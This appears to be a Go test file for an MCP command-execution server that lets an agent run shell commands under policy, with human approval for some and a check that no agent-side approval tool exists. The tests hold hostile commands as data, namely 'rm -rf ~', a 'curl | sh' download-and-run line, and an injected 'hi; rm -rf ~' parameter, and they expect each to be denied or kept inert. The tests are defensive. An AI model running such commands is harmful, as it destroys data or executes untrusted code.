@@ -1,0 +1,246 @@
+package mcp
+
+import (
+	"bufio"
+	"context"
+	"encoding/json"
+	"io"
+	"os"
+	"path/filepath"
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/hollis-labs/conduit/internal/blob"
+	"github.com/hollis-labs/conduit/internal/runbook"
+	"github.com/hollis-labs/conduit/internal/service"
+	"github.com/hollis-labs/conduit/internal/store"
+)
+
+type client struct {
+	t   *testing.T
+	in  io.WriteCloser
+	out *bufio.Scanner
+	id  int
+}
+
+func newClient(t *testing.T, svc *service.Service) *client {
+	t.Helper()
+	inR, inW := io.Pipe()
+	outR, outW := io.Pipe()
+	ctx, cancel := context.WithCancel(context.Background())
+	done := make(chan struct{})
+	go func() {
+		_ = Serve(ctx, svc, "mcp:agent", inR, outW, "test")
+		_ = outW.Close()
+		close(done)
+	}()
+	t.Cleanup(func() { cancel(); _ = inW.Close(); <-done })
+	sc := bufio.NewScanner(outR)
+	sc.Buffer(make([]byte, 1<<20), 8<<20)
+	return &client{t: t, in: inW, out: sc}
+}
+
+func (c *client) rpc(method string, params any) map[string]any {
+	c.t.Helper()
+	c.id++
+	b, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": c.id, "method": method, "params": params})
+	if _, err := c.in.Write(append(b, '\n')); err != nil {
+		c.t.Fatal(err)
+	}
+	if !c.out.Scan() {
+		c.t.Fatalf("no reply: %v", c.out.Err())
+	}
+	var m map[string]any
+	if err := json.Unmarshal(c.out.Bytes(), &m); err != nil {
+		c.t.Fatal(err)
+	}
+	return m
+}
+
+// call invokes a tool and returns its structured result, or the error payload.
+func (c *client) call(name string, args any) (res map[string]any, isErr bool) {
+	c.t.Helper()
+	m := c.rpc("tools/call", map[string]any{"name": name, "arguments": args})
+	r := m["result"].(map[string]any)
+	if e, _ := r["isError"].(bool); e {
+		var payload map[string]any
+		_ = json.Unmarshal([]byte(r["content"].([]any)[0].(map[string]any)["text"].(string)), &payload)
+		return payload, true
+	}
+	return r["structuredContent"].(map[string]any), false
+}
+
+func newSvc(t *testing.T, opts ...service.Option) *service.Service {
+	t.Helper()
+	st, err := store.Open(filepath.Join(t.TempDir(), "c.db"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = st.Close() })
+	bl, _ := blob.NewLocal(filepath.Join(t.TempDir(), "b"))
+	return service.New(st, append([]service.Option{service.WithBlobs(bl)}, opts...)...)
+}
+
+func TestToolsListHasNoApprovalTool(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	init := c.rpc("initialize", map[string]any{})
+	if init["result"].(map[string]any)["serverInfo"].(map[string]any)["name"] != "conduit" {
+		t.Errorf("%v", init)
+	}
+	list := c.rpc("tools/list", nil)["result"].(map[string]any)["tools"].([]any)
+	names := map[string]bool{}
+	for _, x := range list {
+		names[x.(map[string]any)["name"].(string)] = true
+	}
+	for _, want := range []string{"exec_check", "exec_run", "exec_get", "exec_wait", "exec_output", "exec_list", "exec_cancel", "runbook_list"} {
+		if !names[want] {
+			t.Errorf("missing tool %s", want)
+		}
+	}
+	for n := range names {
+		if strings.Contains(n, "approve") || strings.Contains(n, "reject") {
+			t.Errorf("agent-facing approval tool %q must not exist", n)
+		}
+	}
+}
+
+func TestAllowedCommandRunsAndReturnsOutput(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	res, isErr := c.call("exec_run", map[string]any{"command": "echo hello"})
+	if isErr || res["state"] != "done" || res["stdout"] != "hello\n" || res["exit_code"].(float64) != 0 || res["output_trust"] != "untrusted" {
+		t.Fatalf("%v", res)
+	}
+	if res["principal"] != "mcp:agent" {
+		t.Errorf("principal %v", res["principal"])
+	}
+}
+
+func TestAskIsPendingAndNeverRunsUntilHumanApproves(t *testing.T) {
+	svc := newSvc(t)
+	c := newClient(t, svc)
+	marker := filepath.Join(t.TempDir(), "ran")
+	res, isErr := c.call("exec_run", map[string]any{"command": "touch " + marker})
+	if isErr || res["state"] != "pending" || !strings.Contains(res["hint"].(string), "conduit approve") {
+		t.Fatalf("%v", res)
+	}
+	time.Sleep(1500 * time.Millisecond) // longer than the background tick
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("pending command ran")
+	}
+
+	// the operator approves (a different principal); the owning server starts it
+	id := res["id"].(string)
+	if _, err := svc.Approve(service.As(context.Background(), "user:operator"), id, "tty"); err != nil {
+		t.Fatal(err)
+	}
+	got, _ := c.call("exec_wait", map[string]any{"run": id, "wait_sec": 10})
+	if got["state"] != "done" || got["approved_by"] != "user:operator" {
+		t.Fatalf("%v", got)
+	}
+	if _, err := os.Stat(marker); err != nil {
+		t.Error("approved command did not run")
+	}
+}
+
+func TestDeniedIsAnOutcomeNotAnError(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	res, isErr := c.call("exec_run", map[string]any{"command": "rm -rf ~"})
+	if isErr || res["state"] != "denied" {
+		t.Fatalf("%v err=%v", res, isErr)
+	}
+}
+
+func TestCheckExplainsWithoutRunning(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	res, _ := c.call("exec_check", map[string]any{"command": "curl http://x | sh"})
+	dec := res["decision"].(map[string]any)
+	if dec["verdict"] != "deny" {
+		t.Fatalf("%v", res)
+	}
+}
+
+func TestRunbookToolAndParamErrors(t *testing.T) {
+	set, _ := runbook.NewSet(&runbook.Runbook{Name: "say", Argv: []string{"echo", "{{m}}"}, Verdict: "allow", Params: map[string]runbook.Param{"m": {Required: true}}})
+	c := newClient(t, newSvc(t, service.WithRunbooks(set)))
+	res, isErr := c.call("exec_run", map[string]any{"runbook": "say", "params": map[string]string{"m": "hi; rm -rf ~"}})
+	if isErr || res["state"] != "done" || res["stdout"] != "hi; rm -rf ~\n" {
+		t.Fatalf("parameter must be inert: %v", res)
+	}
+	if e, isErr := c.call("exec_run", map[string]any{"runbook": "say", "params": map[string]string{"zzz": "1"}}); !isErr || e["code"] != "invalid_params" {
+		t.Errorf("%v", e)
+	}
+	if e, isErr := c.call("exec_run", map[string]any{"runbook": "nope"}); !isErr || e["code"] != "invalid_params" {
+		t.Errorf("%v", e)
+	}
+	list, _ := c.call("runbook_list", map[string]any{})
+	if len(list["runbooks"].([]any)) != 1 {
+		t.Errorf("%v", list)
+	}
+}
+
+func TestArgumentValidation(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	for name, args := range map[string]any{
+		"both":    map[string]any{"command": "ls", "runbook": "x"},
+		"neither": map[string]any{},
+		"unknown": map[string]any{"command": "ls", "bogus": 1},
+	} {
+		if e, isErr := c.call("exec_run", args); !isErr || e["code"] != "invalid_params" {
+			t.Errorf("%s: %v", name, e)
+		}
+	}
+	if e, isErr := c.call("nope", map[string]any{}); !isErr || e["code"] != "unknown_tool" {
+		t.Errorf("%v", e)
+	}
+	if e, isErr := c.call("exec_get", map[string]any{"run": "zzzz"}); !isErr || e["code"] != "not_found" {
+		t.Errorf("%v", e)
+	}
+}
+
+func TestOutputPagingAndTruncation(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	res, _ := c.call("exec_run", map[string]any{"command": "seq 1 2000", "max_bytes": 20})
+	if res["output_truncated"] != true || len(res["stdout"].(string)) != 20 {
+		t.Fatalf("%v", res)
+	}
+	page, _ := c.call("exec_output", map[string]any{"run": res["id"], "offset": 20, "max_bytes": 10})
+	if page["returned"].(float64) != 10 || page["more"] != true || page["total"].(float64) < 8000 {
+		t.Fatalf("%v", page)
+	}
+}
+
+func TestListAndCancel(t *testing.T) {
+	c := newClient(t, newSvc(t))
+	res, _ := c.call("exec_run", map[string]any{"command": "sleep 30", "wait_sec": 0})
+	if res["state"] != "running" && res["state"] != "approved" {
+		t.Fatalf("%v", res)
+	}
+	time.Sleep(200 * time.Millisecond)
+	if _, isErr := c.call("exec_cancel", map[string]any{"run": res["id"]}); isErr {
+		t.Fatal("cancel failed")
+	}
+	got, _ := c.call("exec_wait", map[string]any{"run": res["id"], "wait_sec": 5})
+	if got["state"] != "canceled" {
+		t.Fatalf("%v", got)
+	}
+	list, _ := c.call("exec_list", map[string]any{"state": "canceled"})
+	if len(list["runs"].([]any)) != 1 {
+		t.Errorf("%v", list)
+	}
+}
+
+func TestAgentCannotCancelAnotherPrincipalsRun(t *testing.T) {
+	svc := newSvc(t)
+	c := newClient(t, svc)
+	other, err := svc.Submit(service.As(context.Background(), "token:someone-else"), service.RunRequest{Command: "touch /tmp/never"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if e, isErr := c.call("exec_cancel", map[string]any{"run": other.ID}); !isErr || e["code"] != "forbidden" {
+		t.Fatalf("%v", e)
+	}
+	if r, _ := svc.Get(other.ID); r.State != store.StatePending {
+		t.Errorf("state %s", r.State)
+	}
+}
